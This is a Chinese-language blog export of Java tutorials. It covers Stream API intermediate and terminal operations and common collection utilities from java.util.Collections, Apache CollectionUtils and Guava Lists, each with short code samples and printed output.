<h4 id="映射（map）"><a href="#映射（map）" class="headerlink" title="映射（map）"></a>映射（map）</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MapOperation</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        List&lt;String&gt; words = Arrays.asList(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;world&quot;</span>);</span><br><span class="line">        words.stream()</span><br><span class="line">              .map(String::toUpperCase)</span><br><span class="line">              .forEach(System.out::println);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="扁平化映射（flatMap）"><a href="#扁平化映射（flatMap）" class="headerlink" title="扁平化映射（flatMap）"></a>扁平化映射（flatMap）</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.stream.Stream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FlatMapOperation</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; nestedList = Arrays.asList(</span><br><span class="line">                Arrays.asList(<span class="number">1</span>, <span class="number">2</span>),</span><br><span class="line">                Arrays.asList(<span class="number">3</span>, <span class="number">4</span>),</span><br><span class="line">                Arrays.asList(<span class="number">5</span>, <span class="number">6</span>)</span><br><span class="line">        );</span><br><span class="line">        Stream&lt;Integer&gt; flatStream = nestedList.stream()</span><br><span class="line">              .flatMap(List::stream);</span><br><span class="line">        flatStream.forEach(System.out::println);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="排序（sorted）"><a href="#排序（sorted）" class="headerlink" title="排序（sorted）"></a>排序（sorted）</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SortedOperation</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; numbers = Arrays.asList(<span class="number">3</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">9</span>);</span><br><span class="line">        numbers.stream()</span><br><span class="line">              .sorted()</span><br><span class="line">              .forEach(System.out::println);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 自定义排序</span></span><br><span class="line">        numbers.stream()</span><br><span class="line">              .sorted((a, b) -&gt; b - a)</span><br><span class="line">              .forEach(System.out::println);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="去重（distinct）"><a href="#去重（distinct）" class="headerlink" title="去重（distinct）"></a>去重（distinct）</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DistinctOperation</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; numbers = Arrays.asList(<span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>);</span><br><span class="line">        numbers.stream()</span><br><span class="line">              .distinct()</span><br><span class="line">              .forEach(System.out::println);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="截断（limit）和跳过（skip）"><a href="#截断（limit）和跳过（skip）" class="headerlink" title="截断（limit）和跳过（skip）"></a>截断（limit）和跳过（skip）</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LimitAndSkipOperation</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; numbers = Arrays.asList(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>);</span><br><span class="line">        <span class="comment">// 取前 3 个元素</span></span><br><span class="line">        numbers.stream()</span><br><span class="line">              .limit(<span class="number">3</span>)</span><br><span class="line">              .forEach(System.out::println);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 跳过前 2 个元素</span></span><br><span class="line">        numbers.stream()</span><br><span class="line">              .skip(<span class="number">2</span>)</span><br><span class="line">              .forEach(System.out::println);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="终止操作"><a href="#终止操作" class="headerlink" title="终止操作"></a>终止操作</h3><p>终止操作会触发中间操作的执行，并产生一个最终结果，常见的终止操作有：</p>
<h4 id="遍历（forEach）"><a href="#遍历（forEach）" class="headerlink" title="遍历（forEach）"></a>遍历（forEach）</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ForEachOperation</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        List&lt;String&gt; names = Arrays.asList(<span class="string">&quot;Alice&quot;</span>, <span class="string">&quot;Bob&quot;</span>, <span class="string">&quot;Charlie&quot;</span>);</span><br><span class="line">        names.stream()</span><br><span class="line">              .forEach(System.out::println);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="收集（collect）"><a href="#收集（collect）" class="headerlink" title="收集（collect）"></a>收集（collect）</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.stream.Collectors;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CollectOperation</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        List&lt;Person&gt; people = Arrays.asList(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Alice&quot;</span>, <span class="number">25</span>),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Bob&quot;</span>, <span class="number">30</span>),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Charlie&quot;</span>, <span class="number">25</span>)</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 收集到 List</span></span><br><span class="line">        List&lt;String&gt; names = people.stream()</span><br><span class="line">              .map(Person::getName)</span><br><span class="line">              .collect(Collectors.toList());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 按年龄分组</span></span><br><span class="line">        Map&lt;Integer, List&lt;Person&gt;&gt; groupedByAge = people.stream()</span><br><span class="line">              .collect(Collectors.groupingBy(Person::getAge));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 拼接名字</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">namesJoined</span> <span class="operator">=</span> people.stream()</span><br><span class="line">              .map(Person::getName)</span><br><span class="line">              .collect(Collectors.joining(<span class="string">&quot;, &quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="统计（count）"><a href="#统计（count）" class="headerlink" title="统计（count）"></a>统计（count）</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CountOperation</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        List&lt;String&gt; names = Arrays.asList(<span class="string">&quot;Alice&quot;</span>, <span class="string">&quot;Bob&quot;</span>, <span class="string">&quot;Charlie&quot;</span>);</span><br><span class="line">        <span class="type">long</span> <span class="variable">count</span> <span class="operator">=</span> names.stream()</span><br><span class="line">              .count();</span><br><span class="line">        System.out.println(<span class="string">&quot;Number of names: &quot;</span> + count);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="查找（findFirst、findAny）"><a href="#查找（findFirst、findAny）" class="headerlink" title="查找（findFirst、findAny）"></a>查找（findFirst、findAny）</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Optional;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FindOperation</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; numbers = Arrays.asList(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>);</span><br><span class="line">        Optional&lt;Integer&gt; firstEven = numbers.stream()</span><br><span class="line">              .filter(n -&gt; n % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">              .findFirst();</span><br><span class="line">        <span class="keyword">if</span> (firstEven.isPresent()) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;First even number: &quot;</span> + firstEven.get());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Optional&lt;Integer&gt; anyEven = numbers.parallelStream()</span><br><span class="line">              .filter(n -&gt; n % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">              .findAny();</span><br><span class="line">        <span class="keyword">if</span> (anyEven.isPresent()) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Any even number: &quot;</span> + anyEven.get());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="匹配（allMatch、anyMatch、noneMatch）"><a href="#匹配（allMatch、anyMatch、noneMatch）" class="headerlink" title="匹配（allMatch、anyMatch、noneMatch）"></a>匹配（allMatch、anyMatch、noneMatch）</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MatchOperation</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; numbers = Arrays.asList(<span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">allEven</span> <span class="operator">=</span> numbers.stream()</span><br><span class="line">              .allMatch(n -&gt; n % <span class="number">2</span> == <span class="number">0</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;All numbers are even: &quot;</span> + allEven);</span><br><span class="line"></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">anyGreaterThanFive</span> <span class="operator">=</span> numbers.stream()</span><br><span class="line">              .anyMatch(n -&gt; n &gt; <span class="number">5</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Any number is greater than 5: &quot;</span> + anyGreaterThanFive);</span><br><span class="line"></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">noneGreaterThanTen</span> <span class="operator">=</span> numbers.stream()</span><br><span class="line">              .noneMatch(n -&gt; n &gt; <span class="number">10</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;None of the numbers is greater than 10: &quot;</span> + noneGreaterThanTen);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="归约（reduce）"><a href="#归约（reduce）" class="headerlink" title="归约（reduce）"></a>归约（reduce）</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Optional;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReduceOperation</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; numbers = Arrays.asList(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>);</span><br><span class="line">        <span class="comment">// 无初始值的归约</span></span><br><span class="line">        Optional&lt;Integer&gt; sumWithoutInitial = numbers.stream()</span><br><span class="line">              .reduce((a, b) -&gt; a + b);</span><br><span class="line">        <span class="keyword">if</span> (sumWithoutInitial.isPresent()) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Sum without initial value: &quot;</span> + sumWithoutInitial.get());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 有初始值的归约</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">sumWithInitial</span> <span class="operator">=</span> numbers.stream()</span><br><span class="line">              .reduce(<span class="number">10</span>, (a, b) -&gt; a + b);</span><br><span class="line">        System.out.println(<span class="string">&quot;Sum with initial value: &quot;</span> + sumWithInitial);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="并行流"><a href="#并行流" class="headerlink" title="并行流"></a>并行流</h3><p>并行流可以利用多核处理器并行处理元素，提高处理效率。但并行流并不适用于所有场景，使用时需要注意线程安全和性能开销。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ParallelStreamExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; numbers = Arrays.asList(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>);</span><br><span class="line">        numbers.parallelStream()</span><br><span class="line">              .map(n -&gt; n * <span class="number">2</span>)</span><br><span class="line">              .forEach(System.out::println);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java总结一【通用工具库】</title>
    <url>/cnblogs.github.io/p/213d.html</url>
    <content><![CDATA[<h2 id="1-Collections"><a href="#1-Collections" class="headerlink" title="1. Collections"></a>1. Collections</h2><p>首先是 java.util 包下的 Collections 类。这个类主要用于操作集合，我个人非常喜欢使用它。以下是一些常用功能：</p>
<h3 id="1-1-排序"><a href="#1-1-排序" class="headerlink" title="1.1 排序"></a>1.1 排序</h3><p>在工作中，经常需要对集合进行排序。让我们看看如何使用 Collections 工具实现升序和降序排列：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;Integer&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">list.add(<span class="number">2</span>);</span><br><span class="line">list.add(<span class="number">1</span>);</span><br><span class="line">list.add(<span class="number">3</span>);</span><br><span class="line">Collections.sort(list); <span class="comment">//升序</span></span><br><span class="line">System.out.println(list);</span><br><span class="line">Collections.reverse(list); <span class="comment">//降序</span></span><br><span class="line">System.out.println(list);</span><br></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[1, 2, 3]</span><br><span class="line">[3, 2, 1]</span><br></pre></td></tr></table></figure>

<h3 id="1-2-获取最大值或最小值"><a href="#1-2-获取最大值或最小值" class="headerlink" title="1.2 获取最大值或最小值"></a>1.2 获取最大值或最小值</h3><p>有时需要在集合中找到最大值或最小值，这时可以使用 Collections 的 max 和 min 方法。 例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;Integer&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">list.add(<span class="number">2</span>);</span><br><span class="line">list.add(<span class="number">1</span>);</span><br><span class="line">list.add(<span class="number">3</span>);</span><br><span class="line"><span class="type">Integer</span> <span class="variable">max</span> <span class="operator">=</span> Collections.max(list);</span><br><span class="line"><span class="type">Integer</span> <span class="variable">min</span> <span class="operator">=</span> Collections.min(list);</span><br><span class="line">System.out.println(max);</span><br><span class="line">System.out.println(min);</span><br></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3</span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<h3 id="1-3-返回空集合"><a href="#1-3-返回空集合" class="headerlink" title="1.3 返回空集合"></a>1.3 返回空集合</h3><p>有时，在检查为空后，我们需要返回一个空集合，可以使用 emptyList 方法。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> List&lt;Integer&gt; <span class="title function_">fun</span><span class="params">(List&lt;Integer&gt; list)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (list == <span class="literal">null</span> || list.size() == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> Collections.emptyList();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> list;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-4-转换为不可修改的集合"><a href="#1-4-转换为不可修改的集合" class="headerlink" title="1.4 转换为不可修改的集合"></a>1.4 转换为不可修改的集合</h3><p>为了防止后续程序修改某个集合的结果，有时我们需要将某个集合定义为不可修改的。这可以通过使用 Collections 的 unmodifiablexxx 方法轻松实现：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;Integer&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">list.add(<span class="number">2</span>);</span><br><span class="line">list.add(<span class="number">1</span>);</span><br><span class="line">list.add(<span class="number">3</span>);</span><br><span class="line">List&lt;Integer&gt; integers = Collections.unmodifiableList(list);</span><br><span class="line">integers.add(<span class="number">4</span>);</span><br><span class="line">System.out.println(integers);</span><br></pre></td></tr></table></figure>

<h3 id="1-5-转换为线程安全的集合"><a href="#1-5-转换为线程安全的集合" class="headerlink" title="1.5 转换为线程安全的集合"></a>1.5 转换为线程安全的集合</h3><p>我们都知道，Java 中的许多集合，如 ArrayList、LinkedList、HashMap、HashSet 等，都不是线程安全的。 换句话说，在多线程环境中，向这些集合中添加数据存在线程安全问题。这时，可以使用 Collections 的 synchronizedxxx 方法直接将这些线程不安全的集合转换为线程安全的集合。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;Integer&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">list.add(<span class="number">2</span>);</span><br><span class="line">list.add(<span class="number">1</span>);</span><br><span class="line">list.add(<span class="number">3</span>);</span><br><span class="line">List&lt;Integer&gt; integers = Collections.synchronizedList(list); <span class="comment">//将 ArrayList 转换为线程安全的集合</span></span><br><span class="line">System.out.println(integers);</span><br></pre></td></tr></table></figure>
<p>它的底层实现会创建SynchronizedRandomAccessList 或 SynchronizedList 类。这两个类的许多方法都会用 synchronized 加锁。</p>
<h2 id="2-CollectionUtils"><a href="#2-CollectionUtils" class="headerlink" title="2. CollectionUtils"></a>2. CollectionUtils</h2><p>对于集合操作，除了前面提到的 Collections 工具类，CollectionUtils 工具类也非常常用。目前，比较主流的是 apache 的org.apache.commons.collections 包下的 CollectionUtils 工具类。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>当然，Spring 框架的 org.springframework.util 包下也有 CollectionUtils 工具类。不过，我个人推荐使用 apache 包下的 CollectionUtils 工具类，因为它的工具更多且更全面。举个简单的例子，Spring 中的 CollectionUtils 工具类没有判断集合是否不为空的方法，而 apache 中的有。 接下来，我们以 apache 中的 CollectionUtils 工具类为例，介绍一些常用方法。</p>
<h3 id="2-1-检查集合是否为空"><a href="#2-1-检查集合是否为空" class="headerlink" title="2.1 检查集合是否为空"></a>2.1 检查集合是否为空</h3><p>CollectionUtils 工具类的 isEmpty 方法可以轻松判断集合是否为空，isNotEmpty 方法判断集合是否不为空。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;Integer&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">list.add(<span class="number">2</span>);</span><br><span class="line">list.add(<span class="number">1</span>);</span><br><span class="line">list.add(<span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span> (CollectionUtils.isEmpty(list)) &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;Collection is empty.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (CollectionUtils.isNotEmpty(list)) &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;Collection is not empty&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-2-对两个集合进行操作"><a href="#2-2-对两个集合进行操作" class="headerlink" title="2.2 对两个集合进行操作"></a>2.2 对两个集合进行操作</h3><p>有时我们需要对两个已有的集合进行操作，比如取交集或并集。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;Integer&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">list.add(<span class="number">2</span>);</span><br><span class="line">list.add(<span class="number">1</span>);</span><br><span class="line">list.add(<span class="number">3</span>);</span><br><span class="line">List&lt;Integer&gt; list2 = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">list2.add(<span class="number">2</span>);</span><br><span class="line">list2.add(<span class="number">4</span>);</span><br><span class="line"><span class="comment">//获取并集</span></span><br><span class="line">Collection&lt;Integer&gt; unionList = CollectionUtils.union(list, list2);</span><br><span class="line">System.out.println(unionList);</span><br><span class="line"><span class="comment">//获取交集</span></span><br><span class="line">Collection&lt;Integer&gt; intersectionList = CollectionUtils.intersection(list, list2);</span><br><span class="line">System.out.println(intersectionList);</span><br><span class="line"><span class="comment">//获取交集的补集</span></span><br><span class="line">Collection&lt;Integer&gt; disjunctionList = CollectionUtils.disjunction(list, list2);</span><br><span class="line">System.out.println(disjunctionList);</span><br><span class="line"><span class="comment">//获取差集</span></span><br><span class="line">Collection&lt;Integer&gt; subtractList = CollectionUtils.subtract(list, list2);</span><br><span class="line">System.out.println(subtractList);</span><br></pre></td></tr></table></figure>
<p>执行结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[1, 2, 3, 4]</span><br><span class="line">[2]</span><br><span class="line">[1, 3, 4]</span><br><span class="line">[1, 3]</span><br></pre></td></tr></table></figure>

<h2 id="3-Lists"><a href="#3-Lists" class="headerlink" title="3. Lists"></a>3. Lists</h2><p>如果你引入 com.google.guava 的依赖，会得到很多有用的工具类。这里推荐一个 com.google.common.collect 包下的集合工具：Lists。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.google.guava<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>guava<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>28.2-jre<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="3-1-快速初始化集合"><a href="#3-1-快速初始化集合" class="headerlink" title="3.1 快速初始化集合"></a>3.1 快速初始化集合</h3><p>有时，我们想初始化集合中的一些元素，这时可以使用 Lists 的 newArrayList 方法。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;Integer&gt; list = Lists.newArrayList(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br></pre></td></tr></table></figure>
<p>这比直接创建一个列表然后逐个添加元素更方便。 执行结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[1, 2, 3]</span><br></pre></td></tr></table></figure>

<h3 id="3-2-笛卡尔积"><a href="#3-2-笛卡尔积" class="headerlink" title="3.2 笛卡尔积"></a>3.2 笛卡尔积</h3><p>如果你想对两个集合进行笛卡尔积操作，Lists 的 cartesianProduct 方法可以帮你实现：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;Integer&gt; list1 = Lists.newArrayList(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">List&lt;Integer&gt; list2 = Lists.newArrayList(<span class="number">4</span>, <span class="number">5</span>);</span><br><span class="line">List&lt;List&lt;Integer&gt;&gt; productList = Lists.cartesianProduct(list1, list2);</span><br><span class="line">System.out.println(productList);</span><br></pre></td></tr></table></figure>
<p>执行结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[[1, 4], [1, 5], [2, 4], [2, 5], [3, 4], [3, 5]]</span><br></pre></td></tr></table></figure>

<h3 id="3-3-分割集合"><a href="#3-3-分割集合" class="headerlink" title="3.3 分割集合"></a>3.3 分割集合</h3><p>如果你想将一个大集合分割成几个小集合，可以使用 Lists 的 partition 方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;Integer&gt; list = Lists.newArrayList(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>);</span><br><span class="line">List&lt;List&lt;Integer&gt;&gt; partitionList = Lists.partition(list, <span class="number">2</span>);</span><br><span class="line">System.out.println(partitionList);</span><br></pre></td></tr></table></figure>
<p>执行结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[[1, 2], [3, 4], [5]]</span><br></pre></td></tr></table></figure>
<p>在这个例子中，列表有 5 条数据。我将列表集合分成了 3 份，每份大小为 2，即变成了 3 个小集合。 这是我最喜欢的方法之一，我在项目中经常使用。</p>
